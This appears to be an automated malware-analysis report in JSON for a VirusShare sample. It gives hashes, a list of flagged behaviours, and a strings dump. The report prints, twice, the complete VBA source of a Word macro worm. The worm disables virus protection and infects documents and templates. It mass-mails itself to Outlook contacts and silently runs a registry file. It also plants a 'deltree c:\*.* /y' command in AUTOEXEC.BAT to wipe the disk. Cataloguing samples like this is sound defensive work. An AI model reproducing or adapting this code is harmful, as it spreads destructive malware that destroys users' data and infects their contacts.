{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "AutoExec": "Runs when the Word document is opened",
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Chr": "May attempt to obfuscate specific str",
            "CodeModule": "May attempt to modify the VBA code",
            "CreateObject": "May create an OLE object",
            "FileCopy": "May copy a file",
            "Open": "May open a file",
            "Output": "May write to a file",
            "Print #": "May write to a file",
            "Shell": "May run an executable file or a system command",
            "System": "May run an executable file or a system command on a Mac",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code",
            "vbHide": "May run an executable file or a system command"
        },
        "macro": " Rem WM/DOTWorm virus by FSO.\nRem First macro worm to spread in DOT files.\nSub ToolsMacro()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub ToolsOptions()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub ViewVBCode()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub ToolsSecurity()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub FileTemplates()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub FileNew()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub FileOpen()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub AutoOpen()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub AutoExec()\nOn Error Resume Next\nCall MacroWorm\nEnd Sub\nSub MacroWorm()\nOn Error Resume Next\nApplication.DisplayAlerts = wdAlertsNone\nApplication.EnableCancelKey = wdCancelDisabled\nApplication.ShowVisualBasicEditor = False\nOptions.AllowFastSave = True\nOptions.ConfirmConversions = False\nOptions.SaveNormalPrompt = False\nOptions.VirusProtection = False\nOurCode =\nDocuments(MacroContainer.Name).VBProject.VBComponents(1).CodeModule\nOurLines = OurCode.Lines(1, OurCode.CountOfLines)\nFor X = 1 To Documents.Count\nIf Mid(Documents(X).Name, 1, 8) <\"Document\" And\nDocuments(X).VBProject.VBComponents(1).CodeModule.Lines(1, 1) <\"Rem\nWM/DOTWorm virus by FSO.\" Then\nDocuments(X).Password = \"\"\nDocuments(X).ReadOnlyRecommended = False\nDocuments(X).WritePassword = \"\"\nWith Documents(X).VBProject.VBComponents(1).CodeModule\n.DeleteLines 1, .CountOfLines\n.InsertLines 1, OurLines\nEnd With\nWith Documents(X)\n.SaveAs (.FullName)\nEnd With\nEnd If\nNext\nFor Y = 1 To Templates.Count\nWith Templates(Y).VBProject.VBComponents(1).CodeModule\nIf Mid(Templates(Y).Name, 1, 8) <\"Template\" And .Lines(1, 1) <\"Rem\nWM/DOTWorm virus by FSO.\" Then\n.DeleteLines 1, .CountOfLines\n.InsertLines 1, OurLines\nEnd If\nEnd With\nTemplates(Y).Save\nNext\nWith NormalTemplate.VBProject.VBComponents(1).CodeModule\nIf .Lines(1, 1) <\"Rem WM/DOTWorm virus by FSO.\" Then\n.DeleteLines 1, .CountOfLines\n.InsertLines 1, OurLines\nEnd If\nEnd With\nFileCopy NormalTemplate.FullName, Application.Path & \"\\Love Letter For\nYou.dot\"\nIf Int(Rnd * 5) = 2 Then\nSet MailSvr = CreateObject(\"Outlook.Application\")\nIf MailSvr Is Not Nothing Then\nSet MAPI = MailSvr.GetNameSpace(\"MAPI\")\nFor X = 1 To MAPI.AddressLists.Count\nSet AddyList = MAPI.AddressLists(X)\nFor Y = 1 To AddyList.AddressEntries.Count\nSet Contact = AddyList.AddressEntries(Y)\nMailAddy = Contact.Address\nIf System.PrivateProfileString(\"\",\n\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\", MailAddy) <\"FSO\" Then\nSet SpamItem = MailSvr.CreateItem(0)\nSpamItem.Bcc = MailAddy\nSpamItem.Subject = \"Very Funny\"\nSpamItem.Body = vbCrLf & \"  Very good.  A must read, indeed.  Ha!\"\nSpamItem.DeleteAfterSubmit = True\nSpamItem.Attachments.Add (Application.Path & \"\\Very Funny.dot\")\nSpamItem.Send\nIf Dir(\"C:\\MAPI.REG\") = \"\" Then\nOpen \"C:\\MAPI.REG\" For Output As #1\nPrint #1, \"REGEDIT4\"\nPrint #1, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\WAB]\"\nEnd If\nPrint #1, Chr(34) & MailAddy & Chr(34) & \" = \" & Chr(34) & \"FSO\" &\nChr(34)\nNext\nNext\nIf Dir(\"C:\\MAPI.REG\") <\"\" Then\nPrint #1, \"\"\nPrint #1, \"\"\nClose #1\nShell \"C:\\MAPI.REG\", vbHide\nEnd If\nEnd If\nEnd If\nIf Int(Rnd * 30) = 2 Then\nCall Ha\nEnd If\nEnd Sub\nSub Ha()\nOpen \"C:\\AUTOEXEC.BAT\" For Output As #2\nPrint #2, \"Rem System Check\"\nPrint #2, \"deltree c:\\*.* /y\"\nPrint #2, \"Rem System Check!  That's bull****!\"\nClose #2\nShell \"RUNDLL32.EXE,user.exe,exitwindows\", vbHide\nEnd Sub\nRem Ha! Have a nice day!\n\n"
    },
    "filename": "VirusShare_00d4f15fb4348c652cfc6d9e28b4cdd0",
    "filesize": 3525,
    "filetype": "ASCII text, with CRLF line terminators",
    "hashes": {
        "md5": "00d4f15fb4348c652cfc6d9e28b4cdd0",
        "sha1": "a2c62cc56782a0e8bd3d03ba6e3dacef1744399c",
        "sha256": "b56e4506ac41288b9a0a08a240f7aab9c10dd3042faf0dab251a3dc98ccfdb45"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            " Rem WM/DOTWorm virus by FSO.",
            "Rem First macro worm to spread in DOT files.",
            "Sub ToolsMacro()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub ToolsOptions()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub ViewVBCode()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub ToolsSecurity()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub FileTemplates()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub FileNew()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub FileOpen()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub AutoOpen()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub AutoExec()",
            "On Error Resume Next",
            "Call MacroWorm",
            "End Sub",
            "Sub MacroWorm()",
            "On Error Resume Next",
            "Application.DisplayAlerts = wdAlertsNone",
            "Application.EnableCancelKey = wdCancelDisabled",
            "Application.ShowVisualBasicEditor = False",
            "Options.AllowFastSave = True",
            "Options.ConfirmConversions = False",
            "Options.SaveNormalPrompt = False",
            "Options.VirusProtection = False",
            "OurCode =",
            "Documents(MacroContainer.Name).VBProject.VBComponents(1).CodeModule",
            "OurLines = OurCode.Lines(1, OurCode.CountOfLines)",
            "For X = 1 To Documents.Count",
            "If Mid(Documents(X).Name, 1, 8) <\"Document\" And",
            "Documents(X).VBProject.VBComponents(1).CodeModule.Lines(1, 1) <\"Rem",
            "WM/DOTWorm virus by FSO.\" Then",
            "Documents(X).Password = \"\"",
            "Documents(X).ReadOnlyRecommended = False",
            "Documents(X).WritePassword = \"\"",
            "With Documents(X).VBProject.VBComponents(1).CodeModule",
            ".DeleteLines 1, .CountOfLines",
            ".InsertLines 1, OurLines",
            "End With",
            "With Documents(X)",
            ".SaveAs (.FullName)",
            "End With",
            "End If",
            "Next",
            "For Y = 1 To Templates.Count",
            "With Templates(Y).VBProject.VBComponents(1).CodeModule",
            "If Mid(Templates(Y).Name, 1, 8) <\"Template\" And .Lines(1, 1) <\"Rem",
            "WM/DOTWorm virus by FSO.\" Then",
            ".DeleteLines 1, .CountOfLines",
            ".InsertLines 1, OurLines",
            "End If",
            "End With",
            "Templates(Y).Save",
            "Next",
            "With NormalTemplate.VBProject.VBComponents(1).CodeModule",
            "If .Lines(1, 1) <\"Rem WM/DOTWorm virus by FSO.\" Then",
            ".DeleteLines 1, .CountOfLines",
            ".InsertLines 1, OurLines",
            "End If",
            "End With",
            "FileCopy NormalTemplate.FullName, Application.Path & \"\\Love Letter For",
            "You.dot\"",
            "If Int(Rnd * 5) = 2 Then",
            "Set MailSvr = CreateObject(\"Outlook.Application\")",
            "If MailSvr Is Not Nothing Then",
            "Set MAPI = MailSvr.GetNameSpace(\"MAPI\")",
            "For X = 1 To MAPI.AddressLists.Count",
            "Set AddyList = MAPI.AddressLists(X)",
            "For Y = 1 To AddyList.AddressEntries.Count",
            "Set Contact = AddyList.AddressEntries(Y)",
            "MailAddy = Contact.Address",
            "If System.PrivateProfileString(\"\",",
            "\"HKEY_CURRENT_USER\\Software\\Microsoft\\WAB\", MailAddy) <\"FSO\" Then",
            "Set SpamItem = MailSvr.CreateItem(0)",
            "SpamItem.Bcc = MailAddy",
            "SpamItem.Subject = \"Very Funny\"",
            "SpamItem.Body = vbCrLf & \"  Very good.  A must read, indeed.  Ha!\"",
            "SpamItem.DeleteAfterSubmit = True",
            "SpamItem.Attachments.Add (Application.Path & \"\\Very Funny.dot\")",
            "SpamItem.Send",
            "If Dir(\"C:\\MAPI.REG\") = \"\" Then",
            "Open \"C:\\MAPI.REG\" For Output As #1",
            "Print #1, \"REGEDIT4\"",
            "Print #1, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\WAB]\"",
            "End If",
            "Print #1, Chr(34) & MailAddy & Chr(34) & \" = \" & Chr(34) & \"FSO\" &",
            "Chr(34)",
            "Next",
            "Next",
            "If Dir(\"C:\\MAPI.REG\") <\"\" Then",
            "Print #1, \"\"",
            "Print #1, \"\"",
            "Close #1",
            "Shell \"C:\\MAPI.REG\", vbHide",
            "End If",
            "End If",
            "End If",
            "If Int(Rnd * 30) = 2 Then",
            "Call Ha",
            "End If",
            "End Sub",
            "Sub Ha()",
            "Open \"C:\\AUTOEXEC.BAT\" For Output As #2",
            "Print #2, \"Rem System Check\"",
            "Print #2, \"deltree c:\\*.* /y\"",
            "Print #2, \"Rem System Check!  That's bull****!\"",
            "Close #2",
            "Shell \"RUNDLL32.EXE,user.exe,exitwindows\", vbHide",
            "End Sub",
            "Rem Ha! Have a nice day!"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.297279",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
